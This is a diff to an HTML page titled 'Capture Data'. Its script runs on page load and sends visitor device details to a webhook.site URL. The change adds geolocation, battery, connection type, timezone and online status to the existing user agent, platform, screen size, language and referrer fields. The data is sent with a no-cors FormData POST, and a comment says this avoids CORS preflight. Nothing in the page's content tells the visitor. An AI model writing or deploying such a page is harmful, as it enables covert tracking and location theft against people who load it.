@@ -1,6 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Capture Data</title>
 </head>
 <body>
@@ -10,34 +12,89 @@
         // Direct Webhook URL
         const webhookURL = "https://webhook.site/03405ae5-bd8a-4ab8-af4b-feda3be9176d";
 
-        // Gather device information
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenSize: screen.width + "x" + screen.height,
-            language: navigator.language,
-            referrer: document.referrer
-        };
-
-        // Avoid CORS Preflight by using FormData
-        const formData = new FormData();
-        for (const key in deviceInfo) {
-            formData.append(key, deviceInfo[key]);
+        // Function to get the user's geolocation
+        function getGeolocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    }, reject);
+                } else {
+                    resolve(null);
+                }
+            });
         }
 
-        // Send POST request using FormData
-        fetch(webhookURL, {
-            method: "POST",
-            body: formData,
-            mode: "no-cors", // Disable CORS enforcement
-        })
-        .then(response => {
-            console.log("Data Sent Successfully", response);
-        })
-        .catch(error => {
-            console.error("Error Sending Data", error);
-        });
+        // Function to get Battery Status (may not be supported on all devices)
+        function getBatteryStatus() {
+            return new Promise((resolve, reject) => {
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        resolve({
+                            level: battery.level,
+                            charging: battery.charging
+                        });
+                    }).catch(reject);
+                } else {
+                    resolve(null);
+                }
+            });
+        }
+
+        // Function to get Connection Type (e.g., Wi-Fi, Cellular)
+        function getConnectionType() {
+            return new Promise((resolve) => {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                resolve(connection ? connection.effectiveType : null);
+            });
+        }
+
+        // Gather additional device information
+        async function gatherDeviceInfo() {
+            const geolocation = await getGeolocation();
+            const batteryStatus = await getBatteryStatus();
+            const connectionType = await getConnectionType();
+
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenSize: screen.width + "x" + screen.height,
+                language: navigator.language,
+                referrer: document.referrer,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                geolocation: geolocation,
+                batteryStatus: batteryStatus,
+                connectionType: connectionType,
+                onlineStatus: navigator.onLine
+            };
+
+            // Avoid CORS Preflight by using FormData
+            const formData = new FormData();
+            for (const key in deviceInfo) {
+                formData.append(key, JSON.stringify(deviceInfo[key])); // Ensure all data is stringified
+            }
+
+            // Send POST request using FormData
+            fetch(webhookURL, {
+                method: "POST",
+                body: formData,
+                mode: "no-cors", // Disable CORS enforcement
+            })
+            .then(response => {
+                console.log("Data Sent Successfully", response);
+            })
+            .catch(error => {
+                console.error("Error Sending Data", error);
+            });
+        }
+
+        // Call the function to gather device info
+        gatherDeviceInfo();
     </script>
 </body>
 </html>
+
 
